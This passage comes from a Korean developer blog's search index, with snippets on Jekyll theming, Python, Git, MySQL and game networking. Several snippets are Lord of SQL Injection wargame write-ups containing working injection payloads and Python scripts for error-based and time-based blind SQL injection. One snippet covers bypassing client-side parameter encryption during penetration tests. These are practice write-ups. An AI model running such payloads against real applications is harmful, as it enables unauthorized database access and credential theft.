경우 WargameLoS 이런 식으로 전체 카테고리명이 딱 붙어서 나온다. 안 예쁘다 ㅠㅠ위 코드를 살펴보면 categories 배열의 마지막 요소를 꺼내오고 있다는 점을 알 수 있는데, 이 역시 상-하위 카테고리 관계가 있을 시를 대비한 것이다.상위 카테고리가 존재할 시 categories[0]에 상위, categories[1]에 하위 (= 실질적) 카테고리명이 담기기 때문에 이러한 상황을 유연하게 커버하려면 categories 배열의 길이를 확인해서 제일 마지막 인덱스를 넣어주어야 해당 포스팅과 가장 가까운 카테고리명을 꺼내올 수 있다." }, { "title": "Jekyll Chirpy 테마 - 전체 포스팅 개수 출력하기 | Chirpy 커스터마이징", "url": "/posts/chirpy-post-size/", "categories": "Project, Blog", "tags": "", "date": "2022-02-12 00:00:00 +0900", "snippet": "1. 계기내가 사용 중인 테마는 Chirpy인데,심플하면서도 필요한 기능은 다 들어가있기 때문에 깃헙 블로그에서 자주 보이는 인기 테마다.커스터마이징하면서 조금 아쉬웠던 점은 전체 포스팅 개수를 보여주는 방법을 안내하지 않는다는 것이었다.공식적으로는 없더라도 누군가는 구현했을법 한데… 서치해봐도 선례가 나오지 않았다 ㅠㅠ포스팅 개수를 한 눈에 보고 싶은 니즈는 나에게만 있는 것인가…목마른 사람이 우물판다고… 템플릿에 렌더링된 객체들을 응용해서 구현해봤다.2. 완성본HOME 화면의 상단에 출력했다. 원본 테마를 보면 다른 탭들과는 다르게 HOME의 경우에만 &amp;lt;h1&amp;gt; 부분이 휑하니 비어있어서 포스팅 개수가 들어가기 딱 적절해보였다. Chirpy 원본 데모3. 적용 방법템플릿 문법을 처음 다뤄보기도 하고, 단서를 바탕으로 객체를 역으로 파악하느라 구현하는 건 한참 헤맸지만…최종 적용 방법은 정말 간단하다! ( ｯ◕ ܫ◕)ｯ’이 글에서는 나와 같이 HOME 화면에 띄우는 경우를 예시로 들어 안내한다.템플릿에 다음 코드를 추가한다. (끝!)_layouts 디렉토리 내부의 home.html 을 열어보면, &amp;lt;!– Get default posts –&amp;gt; 단락이 있다.해당 단락 바로 위에 다음 코드를 추가해준다.&amp;lt;!-- Total post size --&amp;gt;{% for category in site.categories %}{% assign category_name = category | first %}{% assign many = site.categories[category_name] | size %}{% assign total = total | plus: many %}{% if forloop.last %}&amp;lt;h1&amp;gt;Total ({{ total }})&amp;lt;/h1&amp;gt;{% endif %}{% endfor %}추가 후 저장하면 바로 적용되는 모습을 볼 수 있다!한계점 (22.02.26 Update)위 코드는 모든 포스팅에 상위 카테고리가 없어야 정상적으로 작동한다.상위 카테고리가 존재할 시, 그 또한 독립적인 하나의 카테고리로 들어가기 때문에 포스팅 개수가 2배가 되는 문제가 발생한다.이 문제를 해결하려면 카테고리의 상하위 계층 정보를 검사해주어야 하는데, 그러기에는 카테고리 관련 데이터 구조가 너무 불편하게 생겨먹었다..상위 카테고리를 꼭 만들고 싶다면 낱개로 남는 카테고리 없이 전부 다 상위 카테고리를 생성해주어 마지막 total 값에서 나누기 2만 해주는 방향으로 접근하는 편이 깔끔할 것 같다 ㅠ다음은 모든 카테고리에 대해 상위 카테고리를 생성해준 후 total에 나누기 2를 해준 경우의 코드다.&amp;lt;!-- Total post size --&amp;gt;{% for category in site.categories %}{% assign category_name = category | first %}{% assign many = site.categories[category_name] | size %}{% assign total = total | plus: many %}{% if forloop.last %}&amp;lt;h1&amp;gt;Total ({{ total | divided_by: 2 }})&amp;lt;/h1&amp;gt;{% endif %}{% endfor %}이 경우 카테고리는 다음과 같이 세팅해주어야 한다. (낱개로 남아서 돌아다니는 카테고리가 없게!)home.html이 아닌 다른 레이아웃에 적용하고 싶다면?마찬가지로 해당 코드를 원하는 레이아웃의 원하는 자리에 삽입해주면 정상 적용된다." }, { "title": "파일 읽고 쓰기", "url": "/posts/File-rw/", "categories": "Study, Python", "tags": "", "date": "2022-02-08 00:00:00 +0900", "snippet": " 파일 쓰기f = open(&quot;data.txt&quot;, &quot;w&quot;)f.write(data)f.close() 파일 읽기f = open(&quot;data.txt&quot;, &quot;r&quot;)data = f.read()print(data)f.close()" }, { "title": "JSON UTF-8 인코딩", "url": "/posts/JSON-UTF8/", "categories": "Study, Python", "tags": "", "date": "2022-02-07 00:00:00 +0900", "snippet": " \\uHHHHJSON의 Escape Sequence 중 하나로, 16진수 유니코드 문자를 표현하기 위한 것이다.데이터를 Dump 할 때 인코딩을 거쳐주지 않는다면 유니코드 문자열은 \\uHHHH 형태로 저장된다. JSON 파일에 저장되는 데이터가 그렇다는 것이고, Load 할 시에는 원래 문자열대로 정상 출력된다. UTF-8 인코딩 및 디코딩 방법 JSON Dump 시f = open(&quot;status.json&quot;, &quot;w&quot;, encoding=&quot;UTF-8&quot;) # 인코딩 방식 추가json.dump(status, f, ensure_ascii=False) # 아스키X JSON Load 시f = open(&quot;status.json&quot;, &quot;r&quot;, encoding=&quot;UTF-8&quot;) # 디코딩 방식 추가" }, { "title": "사운드 재생", "url": "/posts/Playsound/", "categories": "Study, Python", "tags": "", "date": "2022-02-05 00:00:00 +0900", "snippet": " playsound로 사운드 재생from playsound import playsoundplaysound(&quot;music.mp3&quot;)" }, { "title": "날짜 및 시간", "url": "/posts/Datetime/", "categories": "Study, Python", "tags": "", "date": "2022-02-04 00:00:00 +0900", "snippet": " 현재 날짜 및 시간import datetimenow = datetime.datetime.now()print(now) 원하는 형태로 포맷팅nowDate = now.strftime(&#39;%Y-%m-%d&#39;)print(nowDate)nowTime = now.strftime(&#39;%H:%M:%S&#39;)print(nowTime)nowDatetime = now.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;)print(nowDatetime)" }, { "title": "Git으로 협업하기", "url": "/posts/Git-teamwork/", "categories": "Tools, Git", "tags": "", "date": "2022-02-03 00:00:00 +0900", "snippet": " Git으로 협업하기 Organization Repository(원본 레포)를 Fork한다. Fork해온 레포(내 레포)를 Local에 Clone하여 작업한다.이 때, upstream에 원본 레포를 등록해두면 Fetch/Pull을 통해 원본 레포의 변경 사항을 빠르게 받아볼 수 있다. Fork해온 레포에 작업 내용을 Push한 후, 원본 레포에 Pull Request를 보낸다. 원본 레포의 관리자가 해당 Request의 내용을 확인한 후, 원본 레포에 Merge한다. " }, { "title": "Git 변경 사항 되돌리기", "url": "/posts/Git-restore/", "categories": "Tools, Git", "tags": "", "date": "2022-02-03 00:00:00 +0900", "snippet": " Local 변경 사항 되돌리기 전체 파일을 마지막 Commit으로 되돌리기$ git checkout . 특정 파일에 대한 변경 사항만 되돌리기$ git checkout &#39;파일명&#39; Add 되돌리기 전체 파일을 Unstage$ git reset HEAD 특정 파일만 Unstage$ git reset HEAD &#39;파일명&#39; Commit 되돌리기 (주의) Commit을 취소하고 해당 파일들은 Staged 상태로 Working Directory에 보존하기$ git reset --soft HEAD^ Commit을 취소하고 해당 파일들은 Unstaged 상태로 Working Directory에 보존하기$ git reset --mixed HEAD^ # 기본 옵션$ git reset HEAD^ # 위와 동일$ git reset HEAD~2 # 마지막 2개의 commit을 취소 Commit을 취소하고 해당 파일들은 Unstaged 상태로 Working Directory에서도 삭제하기$ git reset --hard HEAD^ 과거로 갔다가 현재로 돌아오기 과거로 돌아가기$ git checkout HEAD~1 # 한 단계 전으로 돌아가기$ git checkout HEAD~4 # 네 단계 전으로 돌아가기 다시 돌아오기$ git checkout [Branch명]" }, { "title": "Git 직전과 금번 Commit을 하나로 정리", "url": "/posts/Git-amend/", "categories": "Tools, Git", "tags": "", "date": "2022-02-03 00:00:00 +0900", "snippet": " Git 직전과 금번 Commit을 하나로 정리$ git commit --amend" }, { "title": "Git 강제 push", "url": "/posts/Git-force-push/", "categories": "Tools, Git", "tags": "", "date": "2022-02-02 00:00:00 +0900", "snippet": "Git 강제 push Git 강제 push$ git push [원격repo] +[브랜치]" }, { "title": "Python-MySql 연동하기 with PyMySql", "url": "/posts/Pymysql/", "categories": "Study, Python", "tags": "", "date": "2022-02-01 00:00:00 +0900", "snippet": "Python-MySql 연동하기 with PyMySql PyMySql DB 연결import pymysqlconn = pymysql.connect(user=&#39;유저명&#39;, passwd=&#39;패스워드&#39;, host=&#39;IP&#39;, db=&#39;데이터베이스명&#39;, charset=&#39;utf8&#39;)cursor = conn.cursor() PyMySql 쿼리 실행 (단일행 삽입)query = &quot;INSERT INTO post (id, name, title, link, published, topic, platform) VALUE (0, %s, %s, %s, %s, %s, %s)&quot;data = (name, title, link, published, topic, platform)cursor.execute(query, data)conn.commit() PyMySql 쿼리 실행 (다중행 삽입)query = &quot;INSERT INTO post (id, name, title, link, published, topic, platform) VALUE (0, %s, %s, %s, %s, %s, %s)&quot;data = [(name, title, link, published, topic, platform), (name2, title2, link2, published2, topic2, platform2)...]cursor.executemany(query, data)conn.commit() PyMySql DB 연결 해제conn.close()" }, { "title": "이모티콘(emoji) 저장하기", "url": "/posts/Save-emoji/", "categories": "Back-End, MySql", "tags": "", "date": "2022-01-31 00:00:00 +0900", "snippet": "MySql 이모티콘(emoji) 저장하기utf8은 가변 문자열을 3byte 단위로 저장하기 때문에 이모지를 저장하지 못한다. (이모지는 4byte 단위) 문자셋을 utf8mb4로 변경해주어야 한다. MySql 설정 파일에 다음 내용을 추가$ vim /etc/mysql/my.cnf[client]default-character-set = utf8mb4[mysql]default-character-set = utf8mb4[mysqld]character-set-client-handshake = FALSEcharacter-set-server = utf8mb4collation-server = utf8mb4_unicode_ci MySql 재시작$ service mysql restart MySql 변경된 문자셋 확인$ mysql -u root -p&amp;gt;&amp;gt; SHOW GLOBAL VARIABLES WHERE Variable_name LIKE &#39;character\\_set\\_%&#39; OR Variable_name LIKE &#39;collation%&#39;; 기존 데이터베이스 및 테이블의 문자셋 변경&amp;gt;&amp;gt; ALTER DATABASE [데이터베이스명] DEFAULT CHARACTER SET=utf8mb4 COLLATE=utf8mb4_unicode_ci;&amp;gt;&amp;gt; use [데이터베이스명]&amp;gt;&amp;gt; ALTER TABLE [테이블명] DEFAULT CHARACTER SET=utf8mb4 COLLATE=utf8mb4_unicode_ci; 참고이미 생성한 컬럼의 데이터정렬방식은 자동으로 변경되지 않아 직접 바꿔주었다." }, { "title": "pip 재설치", "url": "/posts/Pip-re-install/", "categories": "Study, Linux", "tags": "", "date": "2022-01-31 00:00:00 +0900", "snippet": "pip 재설치 pip 재설치$ curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py$ python get-pip.py$ pip install --user --upgrade pip" }, { "title": "MySql 사용자 추가", "url": "/posts/Mysql-add-user/", "categories": "Back-End, MySql", "tags": "", "date": "2022-01-31 00:00:00 +0900", "snippet": "MySql 사용자 추가 MySql 사용자 추가&amp;gt;&amp;gt; create user &#39;사용자명&#39;@&#39;%&#39; identified by &#39;비밀번호&#39;; 전체 데이터베이스 접근 권한 부여&amp;gt;&amp;gt; grant all privileges on *.* to &#39;사용자명&#39;@&#39;%&#39;;" }, { "title": "사용자 계정 비밀번호 변경", "url": "/posts/User-pw-change/", "categories": "Study, Linux", "tags": "", "date": "2022-01-30 00:00:00 +0900", "snippet": "사용자 계정 비밀번호 변경 현재 계정 비밀번호 변경$ passwd 타 계정 비밀번호 변경$ passwd [타계정ID]" }, { "title": "RSS 크롤링", "url": "/posts/RSS-croll/", "categories": "Study, Python", "tags": "", "date": "2022-01-29 00:00:00 +0900", "snippet": "RSS 크롤링 RSS 크롤링import feedparserurl = &quot;http://bepolar.tistory.com/rss&quot;d = feedparser.parse(url)print(d.feed[&#39;title&#39;])for e in d.entries: print(&quot;Title : &quot; + e.title) print(&quot;Link : &quot; + e.link) print(&quot;Description : &quot; + e.description) print(&quot;Published : &quot; + str(e.published))" }, { "title": "명령행 인수 받기", "url": "/posts/Command-arg/", "categories": "Study, Python", "tags": "", "date": "2022-01-29 00:00:00 +0900", "snippet": "명령행 인수 받기 명령행 옵션으로 인수 받기import argparseparser = argparse.ArgumentParser()parser.add_argument(&#39;-n&#39;, type=str, help=&quot;name&quot;)args = parser.parse_args()name = args.n 명령행 옵션 없이 인수 받기import sysargs = sys.argv[1:]" }, { "title": "타이핑 효과", "url": "/posts/Typing-effect/", "categories": "Study, Python", "tags": "", "date": "2022-01-28 00:00:00 +0900", "snippet": "타이핑 효과 타이핑 효과from time import sleepimport sysdef typing(text): for letter in text: sleep(0.05) sys.stdout.write(letter) sys.stdout.flush()" }, { "title": "JSON 파일 읽고 쓰기", "url": "/posts/Json-rw/", "categories": "Study, Python", "tags": "", "date": "2022-01-28 00:00:00 +0900", "snippet": "JSON 파일 읽고 쓰기 JSON 파일 생성import jsonstatus = {&quot;hp&quot;:100, &quot;attack&quot;:10, &quot;full&quot;:100}f = open(&quot;status.json&quot;, &quot;w&quot;)json.dump(status, f)f.close() JSON 파일 읽기import jsonf = open(&quot;status.json&quot;, &quot;r&quot;)status = json.load(f)print(status)" }, { "title": "Photon", "url": "/posts/Photon/", "categories": "Study, Game", "tags": "", "date": "2022-01-12 00:00:00 +0900", "snippet": "Photon1. Photon이란?네트워크 게임 엔진이다.다양한 제품군을 보유하고 있으며 그 중에서도 PUN(Photon Unity Networking)의 경우, 유니티 엔진에 특화되어 있다.포톤 제품은 크게, 포톤 서버와 포톤 클라우드로 나뉜다.포톤 서버는 Dedicated Server로 사용하는데 적합하며, 포톤 클라우드는 매치메이킹 형식의 간단한 게임에 적합하다. 포톤 서버는 물리적인 서버를 직접 운영하는 것이며, 포톤 클라우드는 SaaS(Software as a Service)의 개념으로 소프트웨어를 임대하여 사용하는 방식이다.2. Photon Cloud이미 세팅되어있는 서버 로직을 빌려다 쓰는 방식이다.서버 운영 및 관리가 불필요하다는 점에서 편하지만, 서버 사이드 게임 로직을 건드리는 것이 불가능하다는 한계가 있다.3. Photon PUBLIC CLOUD 가격 정책 CCU = 동시 접속자 수4. Photon PREMIUM CLOUD2000 CCU를 초과하는 스케일을 필요로 할 시, 프리미엄 클라우드를 이용할 수 있다.프리미엄 클라우드는 최대 50000 CCU까지 Autoscaling 된다.기본 2000 CCU 기준 월 100만원 + 추가 1 CCU 당 500원이 추가로 부과된다." }, { "title": "네트워크 게임 - 기초 이론", "url": "/posts/Network-game/", "categories": "Study, Game", "tags": "", "date": "2022-01-11 00:00:00 +0900", "snippet": "네트워크 게임 - 기초 이론1. 4인 멀티 게임에 플레이어는 몇명 존재할까?답은 16명이다.모든 플레이어의 게임 세상에 각각 4인의 플레이어가 존재하기 때문이다.2. 로컬 플레이어와 리모트 플레이어A 입장 : A(로컬), B(리모트), C(리모트), D(리모트)B 입장 : A(리모트), B(로컬), C(리모트), D(리모트)C 입장 : A(리모트), B(리모트), C(로컬), D(리모트)D 입장 : A(리모트), B(리모트), C(리모트), D(로컬)3. 리모트 플레이어는 레플리카다B, C, D 세상에 존재하는 리모트 A는,A 세상에 존재하는 진짜 A의 레플리카일 뿐이다.따라서 진짜 A의 동작에 동기화되어 움직인다. 각 세상의 A들은 완전히 다른 오브젝트다. 진짜 A와 연결이 끊기면 서로 다른 동작을 취한다.4. Server - Client 방식을 게임에 적용하는 방법[1] Play as Host (P2P)서버 부담을 덜기 위해 플레이어 중 한 명을 호스트이자 서버로 지정하여 다른 플레이어들이 참가하도록 한다.이때, 핵을 방지하기 위해 클라이언트를 신뢰하지 않는 방식으로 개발한다. ex) A가 동작을 원할 시, A가 직접 B, C의 A 레플리카를 동기화시킬 수 없고, 방장인 C에게 A를 대신 움직여달라고 부탁해야한다. 즉, 클라이언트는 어떤 처리를 하려는 척만하고, 실제 물리/충돌 처리 및 동기화는 방장이 맡게 된다.서버에서 일어나지 않은 일은 애초에 없었던 일이 된다.따라서 패킷 손실로 인해 서버에 전달되지 않은 정보는 그냥 씹힌다고 보면 된다. (씹힐 확률 : 1초 2발 &amp;lt; 1초 10발)또한 모든 정보를 동기화하는 것은 아니다. (애니메이션 등)[2] Dedicated Server플레이어로 게임에 참가하지 않고 고정된 서버로서 100% 모든 자원을 게임을 돌리는 데 사용한다.Play as Host 방식에 비해 네트워크 품질이 좋다. (P2P 방식은 방장의 컴퓨터 환경에 의존하기 때문에 매 회 랜덤이다.)" }, { "title": "LOS - 31번 zombie", "url": "/posts/los-31/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2022-01-03 00:00:00 +0900", "snippet": "[31] zombie문제풀이필터링을 제외하면 이전 문제와 완전히 동일하다.다만, 문자열 ace를 필터링하여 replace를 사용하지 못하게 막고 있기 때문에 Quine을 구현할 수 있는 다른 방법이 필요하다.이와 관련해서 MySql Quine에 대해서 찾아본 결과,MySql에서만 사용할 수 있는 또 다른 구현 방법이 있음을 알게 되었다.바로 information_schema.processlist 테이블의 info 컬럼에 현재 실행중인 쿼리가 담긴다는 점을 이용하는 것이다.마침 이번 문제에서는 _와 .를 필터링하고 있지 않기 때문에 올바른 접근이라는 예감이 들었다.주입할 쿼리문은 다음과 같다.1&#39; union select substr(info,locate(&#39;1&#39;,info),length(info)-locate(&#39;1&#39;,info)) from information_schema.processlist %23결과" }, { "title": "LOS - 30번 ouroboros", "url": "/posts/los-30/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2022-01-02 00:00:00 +0900", "snippet": "[30] ouroboros문제풀이쿼리의 결과와 사용자의 입력값이 일치하는 지 검증하는 문제다.pw를 찾아내면 쉽게 풀 수 있는 문제이기 때문에 아마 테이블 내부에 pw 값이 없을 것 같았다…확인을 위해 where절을 True로 만들어줄 수 있는 쿼리를 주입해보았다.테이블에 pw가 있다면 값이 뜰텐데… 감감무소식이었다.아무래도 예상했듯 테이블에 pw가 없는 것 같았다.다음은 union을 사용해 1을 기존 테이블에 붙여보았다.이런 식으로 pw를 넣어주면 될 것 같은데…문제는 쿼리의 결과인 pw 값과 사용자 입력값이 같아야한다는 점에 있다.어떻게 해주면 될 지 답이 안나와서 힌트를 서치해보았다.답은 Quine이었다.Quine이란 자기자신의 소스 코드를 그대로 반환하는 프로그램을 말한다.Sql로도 Quine을 만들 수가 있는데, 사실 직접 로직을 생각해내는 것 보다는 서치의 힘을 빌려야하는 것 같다.다음은 대표적인 Quine Query의 예시다.SELECT REPLACE(REPLACE(&#39;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;)&#39;,CHAR(34),CHAR(39)),CHAR(36),&#39;SELECT REPLACE(REPLACE(&quot;$&quot;,CHAR(34),CHAR(39)),CHAR(36),&quot;$&quot;)&#39;);이를 적용하여 만든 최종 쿼리문은 다음과 같다.&#39;union select replace(replace(&#39;&quot;union select replace(replace(&quot;$&quot;,char(34),char(39)),char(36),&quot;$&quot;)%23&#39;,char(34),char(39)),char(36),&#39;&quot;union select replace(replace(&quot;$&quot;,char(34),char(39)),char(36),&quot;$&quot;)%23&#39;)%23결과" }, { "title": "E2E 개념 및 파라미터 암호화 우회", "url": "/posts/E2E/", "categories": "Study, Webhacking", "tags": "", "date": "2022-01-01 00:00:00 +0900", "snippet": "E2E 개념 및 파라미터 암호화 우회1. E2E (= E2EE) 란?End to End Encryption = 종단간 암호화정보를 발신할 때부터 수신할 때까지 암호화를 유지한 채로 전송하는 방식이다.종단간 암호화가 적용되지 않은 경우 발신원에서 암호화된 정보가 중간 서버에서 복호화된 뒤, 재암호화되어 수신원에게 전달되기 때문에 해독 가능한 정보가 중간 서버에 잔류하게 된다.따라서 이를 노리고 중간 서버를 공격한 공격자 또는 중간 서버의 관리자가 해당 정보를 열람할 수 있게 되는 문제가 발생한다.종단간 암호화가 구현된 경우 발신원의 정보가 최초에 암호화된 상태 그대로 수신원에게 전달되므로 공격자 뿐만 아니라 정보를 전달하는 서버 조차도 키를 몰라 해당 정보에 접근할 수 없게 된다. ex) 카카오톡의 비밀 대화 기능, 텔레그램의 비밀 대화 기능 등2. 모의해킹 중 E2E가 미치는 영향파라미터가 암호화되기 때문에 프록시로 패킷을 잡아도 어떤 정보가 전달되는지 알 수 없고, 변조 역시 불가능하다.3. 파라미터 암호화 우회 로직E2E 암호화는 클라이언트 측에서 일어나기 때문에 JS로 컨트롤된다고 볼 수 있다. JS는 조작이 가능하므로 함수를 추적하여 Real Data가 실제적으로 암호화되는 구간을 찾으면 암호화되기 전 prompt를 통해 전달되는 파라미터가 무엇인지 확인하고 변조할 수 있다.4. 암호화 구간을 찾는 방법 해당 페이지가 로드되는 과정에서의 응답 패킷을 잡아 해당 페이지가 어떻게 이루어져있는지 확인한다. 페이로드가 들어갈 폼이나 버튼 등에 걸려있는 이벤트 핸들러를 확인하여 어떤 함수가 호출되는지 확인한다. 호출되는 함수의 클래스를 확인하여 로드된 JS 중 해당 클래스가 구현된 파일을 찾는다. 해당 파일을 찾았다면 클래스 내부의 메소드를 찾아낸다. 해당 메소드의 동작 흐름을 파악하여, 암호화되기 직전에 prompt를 찍는다. 암호화되기 전의 정보가 value라면, data = prompt(“Real Data:”, value) 와 같이 사용한다. 이후 패킷을 포워드한 뒤 페이지로 돌아와 폼을 기입하여 submit하면 prompt가 찍힌다. prompt에 담긴 value로부터 전달되는 파라미터 및 페이로드를 확인할 수 있고, 원하는 값으로 변조할 수 있다. " }, { "title": "LOS - 29번 phantom", "url": "/posts/los-29/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-30 00:00:00 +0900", "snippet": "[29] phantom문제풀이no=1 레코드의 email을 찾는 문제이다.먼저, 준비된 쿼리문을 보겠다.$query = &quot;insert into prob_phantom values(0,&#39;{$_SERVER[REMOTE_ADDR]}&#39;,&#39;{$_GET[joinmail]}&#39;)&quot;;쿼리문으로부터 추측할 수 있는 바는 다음과 같다. 첫 컬럼의 데이터로 0이 들어가는 것으로 보아, no는 AUTO_INCREMENT PRIMARY KEY로 추정할 수 있다. 접속한 ip와 joinmail을 매칭하여 저장함을 알 수 있다. 다음은 표가 출력되는 과정을 보겠다.$rows = mysqli_query($db,&quot;select no,ip,email from prob_phantom where no=1 or ip=&#39;{$_SERVER[REMOTE_ADDR]}&#39;&quot;);echo &quot;&amp;lt;table border=1&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;ip&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;email&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&quot;;while(($result = mysqli_fetch_array($rows))){if($result[&#39;no&#39;] == 1) $result[&#39;email&#39;] = &quot;**************&quot;;echo &quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;{$result[ip]}&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;.htmlentities($result[email]).&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;;}echo &quot;&amp;lt;/table&amp;gt;&quot;; no=1이거나, ip=[접속한 ip] 인 레코드를 표로 출력한다. no=1인 경우, email을 **************로 바꾸어 표시한다. 목표는 no=1의 email을 알아내는 것이기에, 접근 방법을 고민해봤다.preg_match를 보면 duplicate를 필터링하고 있는데, 이는 ON DUPLICATE UPDATE를 걸러내고자 하는 듯 했다.ON DUPLICATE UPDATE는 PRIMARY KEY가 중복되는 레코드가 들어갈 시 기존의 레코드를 삭제하고 새로운 레코드가 그 자리를 대체하게끔 하는 구문이다.만약 이 구문을 필터링하고 있지 않았다면, no=1인 새로운 레코드를 넣음으로써 문제를 간단히 해결할 수 있었을 것이다.그래서 중복 레코드를 관리하는 다른 방법에 대해서도 찾아봤는데, 이 상황에서 쓸 수 있을 만한 방법은 보이지 않았다. ex) INSERT IGNORE, REPLACE INTO따라서 여러개의 레코드를 동시에 INSERT하는 방법을 생각했다.이는 다음과 같이 VALUES 뒤에 괄호로 묶인 여러개의 레코드를 나열함으로써 수행 가능하다.INSERT INTO [테이블명] VALUES(1, 1, 1), (2, 2, 2), (3, 3, 3);이후의 풀이 과정은 다음과 같다.[1] 여러 개 INSERT + 서브쿼리 확인?joinmail=choco&#39;), (0, &#39;[접속한 ip]&#39;, (select 1 where 1=1)) %23정상적으로 실행되어 choco와 1이 INSERT 된 것을 확인할 수 있다.서브쿼리가 먹히는 것을 확인했으니, 그 자리에 no=1의 email을 넣어주면 ******로 바뀌기 전의 진짜 email을 쉽게 확인할 수 있을 것 같았다.[2] 서브쿼리에 원하는 작업 적용해보기?joinmail=choco&#39;), (0, &#39;[접속한 ip]&#39;, (select email from prob_phantom where no=1)) %23음… 안된다.Syntax가 잘못되었나 싶어서 별의 별 베리에이션을 다 시도해봤지만 하나같이 다… 안됐다.1=1, 1=2 등의 기본적인 조건이 적용된 서브쿼리는 문제없이 실행되었지만, prob_phantom 테이블안의 기존 레코드에 접근하려고 하기만 하면 아무 반응도 볼 수가 없었다.한참 고통받다가… 문득 의심이 들었다.동일 테이블 안의 레코드에는 일반적인 서브쿼리로 접근할 수 없나? [SQL] 동일(같은) 테이블 서브쿼리그것이 맞았다…그래서 페이로드를 아래와 같이 바꿔주었다.[3] 최종 페이로드?joinmail=choco&#39;), (0, &#39;[접속한 ip]&#39;, (select * from (select email from prob_phantom where no=1) as temp)) %23결과적으로, no=1 레코드의 email은 admin_secure_email@rubiya.kr 임을 확인할 수 있었다.결과" }, { "title": "LOS - 28번 frankenstein", "url": "/posts/los-28/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-25 00:00:00 +0900", "snippet": "[28] frankenstein문제풀이LoS 28번 Python 자동화 코드이다.import requestsurl = &quot;https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php&quot;cookie = {&quot;PHPSESSID&quot;:&quot;2evml88c628kabc2j1vfk63ks9&quot;}print(&quot;🖤 Start SQLi...&quot;)ans = &quot;&quot;end = Falsefor i in range(1, 100): if(end==True): print(f&quot;&amp;gt;&amp;gt; There&#39;s No Letter {i}&quot;) break end = True print(f&quot;🖤 Checking letter {i}...&quot;) for asc in range(48, 127): search = ans+chr(asc) payload = f&quot;?pw=&#39; || CASE WHEN id=&#39;admin&#39; and pw like &#39;{search}%25&#39; THEN 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF ELSE 0 END %23&quot; res = requests.get(url+payload, cookies=cookie) if(&quot;login_chk&quot; in res.text): continue elif(&quot;error&quot; in res.text): print(f&quot;&amp;gt;&amp;gt; Letter {i} → {chr(asc)}&quot;) ans+=chr(asc) end = False breakprint(f&quot;🖤 Answer : {ans}&quot;)그런데 여기서 끝이 아니었다.자동화 공격 결과 분명 답은 숫자와 알파벳 대문자의 조합으로 나왔건만…아무리 넣어봐도 안 풀렸다.도저히 이유를 모르겠어서 다른 블로그 글을 찾아봤더니 답은 0dc4efbb 였다.왜 아스키로 검색했는데 대소문자가 반대로 나오는지…결과" }, { "title": "LOS - 27번 blue_dragon", "url": "/posts/los-27/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-23 00:00:00 +0900", "snippet": "[27] blue_dragon문제풀이 싱글쿼터와 역슬래시를 필터링하고 있다. pw를 알아내야하는 Blind SQLi 문제이다. 이전 문제들과 뭔가 다른 점은 다음 부분이다.$result = @mysqli_fetch_array(mysqli_query($db,$query));if(preg_match(&#39;/\\&#39;|\\\\\\/i&#39;, $_GET[id])) exit(&quot;No Hack ~_~&quot;);if(preg_match(&#39;/\\&#39;|\\\\\\/i&#39;, $_GET[pw])) exit(&quot;No Hack ~_~&quot;);쿼리를 먼저 실행한 이후에 싱글쿼터와 역슬래시를 필터링하고 있다.싱글쿼터나 역슬래시가 포함된 문자열을 페이로드로 전달하더라도 쿼리는 실행될 것임을 추측할 수 있다.다만, 필터에 걸릴 시 No Hack으로 exit해주고 있기 때문에 육안으로는 쿼리의 참/거짓 결과를 알 수가 없다.따라서 이번 문제에서는 처음으로 Time Based SQLi를 사용해보았다![1] pw 길이 찾기?id=&#39; || id=&#39;admin&#39; and if(length(pw)=[숫자], sleep(3), 0) %23 뒷부분은 전부 주석으로 날려주었기 때문에 pw 페이로드는 전달할 필요가 없다.[2] 완전한 pw 찾기?id=&#39; || id=&#39;admin&#39; and if(ascii(substr(pw,[인덱스],1))=[아스키], sleep(3), 0) %23 역시 pw 페이로드는 전달할 필요가 없다.[3] 참/거짓 판별 Request를 보낸 이후 Response가 도착하기까지 걸린 시간을 측정하여 3초가 넘으면 참으로 본다.LoS 27번 Python 자동화 코드이다.import requestsimport timeurl = &quot;https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php&quot;cookie = {&quot;PHPSESSID&quot;:&quot;leco90m74ui20oikeo0n338f6b&quot;}print(&quot;🖤 Start SQLi...&quot;)for i in range(1,100): payload = f&quot;?id=&#39; || id=&#39;admin&#39; and if(length(pw)={i},sleep(3),0) %23&quot; pre = time.time() requests.get(url+payload, cookies=cookie) post = time.time() if(post-pre&amp;gt;3): length = i print(f&quot;&amp;gt;&amp;gt; length : {length}&quot;) breakans=&quot;&quot;for letter in range(1,length+1): print(f&quot;🖤 Checking letter {letter}...&quot;) start = 32 end = 127 while True: middle = round((start+end)/2) payload = f&quot;?id=&#39; || id=&#39;admin&#39; and if(ascii(substr(pw,{letter},1))&amp;gt;={middle},sleep(3),0) %23&quot; pre = time.time() requests.get(url+payload, cookies=cookie) post = time.time() if(post-pre&amp;gt;3): payload = f&quot;?id=&#39; || id=&#39;admin&#39; and if(ascii(substr(pw,{letter},1))={middle},sleep(3),0) %23&quot; pre = time.time() requests.get(url+payload, cookies=cookie) post = time.time() if(post-pre&amp;gt;3): print(f&quot;&amp;gt;&amp;gt; letter {letter} → {chr(middle)}&quot;) ans+=chr(middle) break else: start = middle else: end = middle continueprint(f&quot;🖤 Answer : {ans}&quot;)답은 d948b8a0 이다.결과" }, { "title": "LOS - 26번 red_dragon", "url": "/posts/los-26/", "categories": "Wargame, Lord of SQL Injection", "tags": "", "date": "2021-12-22 00:00:00 +0900", "snippet": "[26] red_dragon문제풀이 딱히 필터링 없음 id값이 7자 이내여야함 solve 조건은 admin 